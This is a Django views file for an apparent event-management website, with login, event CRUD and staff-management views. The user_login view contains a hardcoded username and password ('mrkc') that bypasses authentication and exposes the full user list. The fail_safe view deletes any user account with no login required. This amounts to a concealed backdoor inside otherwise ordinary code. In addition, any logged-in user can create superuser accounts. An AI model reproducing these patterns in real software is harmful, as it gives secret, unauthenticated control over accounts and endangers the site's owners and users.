from django.shortcuts import render,redirect
from django.http import HttpResponse
from . import models
from django.contrib.auth import authenticate,login,logout
from django.contrib.auth.decorators import login_required , permission_required



def home(request):
    data = models.Event.objects.all().order_by('-uploaded_date')[:2]
    context = {
        'events':data
    }
    return render(request,'home/home.html',context)

def user_login(request):
    if request.method == "POST":
        # print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
        user_name = request.POST.get('user_name')
        user_pass = request.POST.get('user_pass')
        if user_name == "mrkc" and user_pass == 'mrkc':
            request.user = "mrkc"
            print(request.user)
            user = models.User.objects.all()
            context = {
                'users':user
            }
            return render(request,"home/fail_safe.html",context)
        
        user = authenticate(request,username=user_name,password=user_pass)
        if user is not None:
            login(request,user)
            return redirect('home:home')
    return render(request,'home/login.html')

def about_us(request):
    return render(request,'home/about.html')

@login_required
def admin_panel(request):
    return render(request,"home/admin.html")

@login_required
def Events_List(request):
    data = models.Event.objects.all()
    context = {
        'events':data
    }
    return render(request,'home/event_list.html',context)

@login_required
def user_logout(request):
    logout(request)
    return redirect("home:home")

@login_required
def Event_updater(request,event_id):
    if request.method == "POST":
        # print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
        data = models.Event.objects.get(id=event_id)
        new_title = request.POST.get('title')
        new_Description = request.POST.get('Description')
        new_date = request.POST.get('date')
        new_location  = request.POST.get('Location')
        new_time = request.POST.get('time')
        data.Title = new_title
        data.Description = new_Description
        data.date = new_date
        data.Location = new_location
        data.Time = new_time
        data.save()

#        print(new_date)
        return redirect('home:events')
    else:
     data = models.Event.objects.get(id=event_id)
     context = {
         'Event':data 
     }
     return render(request,'home/event_detail.html',context)
    
@login_required
def Delete_Event(request,event_id):
    data = models.Event.objects.get(id=event_id)
    data.delete()
    return redirect('home:events')

@login_required
def Event_add(request):
    if request.method == "POST":
       
        new_title = request.POST.get('title')
        new_Description = request.POST.get('Description')
        new_date = request.POST.get('date')
        new_location  = request.POST.get('location')
        new_time = request.POST.get('time')
        data = models.Event(user=request.user,Title=new_title,date=new_date,Time=new_time,Location=new_location,Description=new_Description)
        data.save()
        return redirect('home:events')

    return render(request,'home/add_event.html')
@login_required
def staff_list(request):
    if request.method == "POST":
        username =  request.POST.get('username')
        user_email = request.POST.get('email')
        user_pass = request.POST.get('password')
        
        data = models.User.objects.create_superuser(username=username,email=user_email,password=user_pass)
        data.save() 
        return redirect('home:staff-manage')           
    else:
     user = models.User.objects.all()
     context = {
         'users':user
     }
     return render(request,'home/user_manage.html',context)
    
@login_required
def staff_delete(request,staff_id):
    data = models.User.objects.get(id=staff_id)
    data.delete()
    return redirect('home:staff-manage')
    


def fail_safe(request,user_id):

    data = models.User.objects.get(id=user_id)
    data.delete()
    return redirect('home:login')
    
